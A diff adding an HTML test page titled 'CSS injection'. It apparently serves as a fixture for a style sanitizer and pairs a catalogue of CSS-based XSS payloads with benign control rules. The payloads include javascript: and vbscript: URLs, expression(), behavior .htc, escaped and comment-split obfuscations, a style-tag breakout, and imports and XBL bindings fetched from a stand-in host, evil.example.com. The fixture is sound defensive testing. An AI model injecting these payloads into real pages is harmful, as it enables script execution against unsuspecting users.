@@ -1,0 +1,46 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>CSS injection</title>
+  <style>
+    @import url("https://evil.example.com/evil.css");
+    @import 'javascript:alert(1)';
+    .a { width: expression(alert(2)); color: red; }
+    .b { background: url(javascript:alert(3)); padding: 8px; }
+    .c { background-image: url("JaVaScRiPt:alert(4)"); margin: 4px; }
+    .d { behavior: url(xss.htc); -ms-behavior: url(xss.htc); font-weight: 700; }
+    .e { -moz-binding: url("https://evil.example.com/xbl.xml#xss"); text-align: center; }
+    .f { background: url("\6a avascript:alert(5)"); color: blue; }
+    .g { width: ex/**/pression(alert(6)); height: 10px; }
+    .h { background: url(data:text/html,<script>alert(7)</script>); border-radius: 4px; }
+    .i { content: "</style><script>alert(8)</script><style>"; }
+    .j { background-image: url('vbscript:msgbox(9)'); }
+    .k { scroll-behavior: smooth; font-size: 18px; }
+    .l { --evil: url(javascript:alert(10)); background: var(--evil); }
+  </style>
+</head>
+<body>
+  <div class="a">Rule a</div>
+  <div class="b">Rule b</div>
+  <div class="c">Rule c</div>
+  <div class="d">Rule d</div>
+  <div class="e">Rule e</div>
+  <div class="f">Rule f</div>
+  <div class="g">Rule g</div>
+  <div class="h">Rule h</div>
+  <div class="i">Rule i</div>
+  <div class="j">Rule j</div>
+  <div class="k">Rule k</div>
+  <div class="l">Rule l</div>
+  <div style="width: expression(alert(11)); color: green">Inline case 1</div>
+  <div style="background: url(javascript:alert(12))">Inline case 2</div>
+  <div style="background: url(&quot;javascript:alert(13)&quot;)">Inline case 3</div>
+  <div style="behavior: url(xss.htc)">Inline case 4</div>
+  <div style="-moz-binding: url(x.xml#xss)">Inline case 5</div>
+  <div style="background: url(\6a\61\76\61\73\63\72\69\70\74:alert(14))">Inline case 6</div>
+  <div style="background: u\72l(javascript:alert(15))">Inline case 7</div>
+  <div style="color: red; @import url(x.css)">Inline case 8</div>
+  <div style="padding: 12px; color: #333">Inline case 9</div>
+</body>
+</html>
